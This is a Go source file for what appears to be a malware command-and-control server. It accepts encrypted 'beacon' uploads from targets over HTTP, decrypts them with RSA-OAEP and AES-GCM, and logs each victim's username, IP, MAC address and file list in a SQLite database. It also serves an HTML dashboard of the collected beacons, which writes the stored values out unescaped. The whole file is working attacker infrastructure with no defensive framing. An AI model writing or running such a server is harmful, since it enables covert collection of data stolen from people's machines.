package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/cipher"
	"crypto/aes"
	"crypto"
	"database/sql"
	"encoding/json"
	"encoding/pem"
	"encoding/binary"
	"strings"

	"fmt"
	"io"
	"log"
	"net/http"
	"os"

	_ "modernc.org/sqlite"
)

const style = `
<style>
:root {
  --bg-color: #0f172a;
  --panel-bg: #1e293b;
  --panel-border: #334155;
  --text-main: #f8fafc;
  --text-muted: #94a3b8;
  --accent-color: #38bdf8;
  --hover-color: #1e293b;
  --row-alt: #111827;
  --code-bg: #0f172a;
  --border-radius: 8px;
}

body {
  background-color: var(--bg-color);
  color: var(--text-main);
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
  padding: 2rem;
  margin: 0;
}

/* Header Styling */
h1 {
  font-size: 1.5rem;
  font-weight: 600;
  letter-spacing: -0.025em;
  color: var(--text-main);
  margin-bottom: 1.5rem;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

h1::before {
  content: "";
  display: inline-block;
  width: 10px;
  height: 10px;
  background-color: #22c55e; /* Active beacon status dot */
  border-radius: 50%;
  box-shadow: 0 0 8px #22c55e;
}

/* Table Container & Wrapper */
.table-container {
  width: 100%;
  overflow-x: auto;
  border-radius: var(--border-radius);
  border: 1px solid var(--panel-border);
  box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
}

table {
  width: 100%;
  border-collapse: collapse;
  text-align: left;
  font-size: 0.875rem;
  background-color: var(--panel-bg);
}

/* Remove default border attribute inline styles */
table[border] {
  border: none;
}

/* Table Headers */
th {
  background-color: #0f172a;
  color: var(--text-muted);
  font-weight: 600;
  text-transform: uppercase;
  font-size: 0.75rem;
  letter-spacing: 0.05em;
  padding: 0.875rem 1rem;
  border-bottom: 1px solid var(--panel-border);
  white-space: nowrap;
}

/* Table Rows & Cells */
td {
  padding: 0.875rem 1rem;
  border-bottom: 1px solid var(--panel-border);
  color: var(--text-main);
  vertical-align: top;
}

tr:last-child td {
  border-bottom: none;
}

tr:hover td {
  background-color: rgba(255, 255, 255, 0.03);
}

/* Technical Data Styling (Monospace formatting for IPs, MAC, Files, Time) */
td:nth-child(1) { /* ID */
  color: var(--text-muted);
  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
  font-weight: 600;
}

td:nth-child(2) { /* User */
  font-weight: 600;
  color: var(--accent-color);
}

td:nth-child(3), /* IP */
td:nth-child(4), /* MAC */
td:nth-child(6) { /* Time */
  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
  color: #e2e8f0;
  white-space: nowrap;
}

/* Files Column Formatting */
td:nth-child(5) {
  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
  font-size: 0.8rem;
  color: #cbd5e1;
  max-width: 450px;
  word-wrap: break-word;
  line-height: 1.5;
}
</style>
`

// Beacon holds the collected information from a target.
type Beacon struct {
	User  string `json:"user"`
	IP    string `json:"ip"`
	MAC   string `json:"mac"`
	Files []string `json:"files"`
}

var (
	db        *sql.DB
	privateKey *rsa.PrivateKey
)

func main() {
	// Load RSA private key
	keyBytes, err := os.ReadFile("private.pem")
	if err != nil {
		log.Fatalf("Failed to read private.pem: %v", err)
	}
	block, _ := pem.Decode(keyBytes)
	if block == nil || block.Type != "PRIVATE KEY" {
		log.Fatal("Invalid private key (expecting PRIVATE KEY)")
	}
	key, err := x509.ParsePKCS8PrivateKey(block.Bytes)
	if err != nil {
		key, err = x509.ParsePKCS1PrivateKey(block.Bytes) // try PKCS#1
		if err != nil {
			log.Fatalf("Failed to parse private key: %v", err)
		}
	}
	var ok bool
	privateKey, ok = key.(*rsa.PrivateKey)
	if !ok {
		log.Fatal("Private key is not an RSA key")
	}

	db, err = sql.Open("sqlite", "beacons.db")
	if err != nil {
		log.Fatalf("Failed to open database: %v", err)
	}
	defer db.Close()

	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS beacons (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		user TEXT,
		ip TEXT,
		mac TEXT,
		files TEXT,
		timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
	)`)
	if err != nil {
		log.Fatalf("Failed to create table: %v", err)
	}

	http.HandleFunc("/collect", handleCollect)
	http.HandleFunc("/list", handleList) // optional: view stored beacons

	port := "8080"
	log.Printf("Listening on :%s", port)
	log.Fatal(http.ListenAndServe(":"+port, nil))
}

func handleCollect(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil || len(body) < 2 {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	// 1. Read 2-byte RSA Key Length prefix
	rsaKeyLen := int(binary.BigEndian.Uint16(body[:2]))

	// Validate overall minimum length: 2 (prefix) + rsaKeyLen + 12 (IV)
	minLen := 2 + rsaKeyLen + 12
	if len(body) < minLen {
		http.Error(w, "Malformed payload structure", http.StatusBadRequest)
		return
	}

	// 2. Extract slices from the payload stream
	offset := 2
	encAesKey := body[offset : offset+rsaKeyLen]
	offset += rsaKeyLen

	iv := body[offset : offset+12]
	offset += 12

	ciphertext := body[offset:]

	// 3. Decrypt the AES Secret Key using RSA-OAEP (SHA-256)
	aesKey, err := privateKey.Decrypt(rand.Reader, encAesKey, &rsa.OAEPOptions{
		Hash:     crypto.SHA256,
		MGFHash:  crypto.SHA1,
		Label:    nil,
	})
	if err != nil {
		log.Printf("RSA decryption failed: %v", err)
		http.Error(w, "Decryption error", http.StatusInternalServerError)
		return
	}

	// 4. Decrypt the payload using AES-GCM
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		log.Printf("AES cipher creation failed: %v", err)
		http.Error(w, "Cipher error", http.StatusInternalServerError)
		return
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Printf("GCM initialization failed: %v", err)
		http.Error(w, "GCM error", http.StatusInternalServerError)
		return
	}

	plaintext, err := gcm.Open(nil, iv, ciphertext, nil)
	if err != nil {
		log.Printf("AES-GCM decryption/authentication failed: %v", err)
		http.Error(w, "Decryption error", http.StatusBadRequest)
		return
	}

	var beacon Beacon
	if err := json.Unmarshal(plaintext, &beacon); err != nil {
		log.Printf("JSON parse error: %v", err)
		http.Error(w, "JSON error", http.StatusBadRequest)
		return
	}

	filesFormatted := strings.Join(beacon.Files, "\n")

	// 6. Insert into database
	_, err = db.Exec("INSERT INTO beacons (user, ip, mac, files) VALUES (?, ?, ?, ?)",
		beacon.User, beacon.IP, beacon.MAC, filesFormatted)
	if err != nil {
		log.Printf("DB insert error: %v", err)
		http.Error(w, "Database error", http.StatusInternalServerError)
		return
	}

	// log.Printf("Beacon received: user=%s ip=%s mac=%s", beacon.User, beacon.IP, beacon.MAC)

	w.WriteHeader(http.StatusOK)
	w.Write([]byte("OK"))
}

// Optional debugging handler: view all beacons
func handleList(w http.ResponseWriter, r *http.Request) {
	rows, err := db.Query("SELECT id, user, ip, mac, files, timestamp FROM beacons ORDER BY timestamp asc")
	if err != nil {
		http.Error(w, "DB error", http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	w.Header().Set("Content-Type", "text/html")
	fmt.Fprint(w, "<table border='1'><tr><th>ID</th><th>User</th><th>IP</th><th>MAC</th><th>Files</th><th>Time</th></tr>")
	for rows.Next() {
		var id int
		var user, ip, mac, files, timestamp string
		rows.Scan(&id, &user, &ip, &mac, &files, &timestamp)
		fmt.Fprintf(w, "<tr><td>%d</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td></tr>",
			id, user, ip, mac, files, timestamp)
	}
	fmt.Fprint(w, style)
	fmt.Fprint(w, "</table>")
}
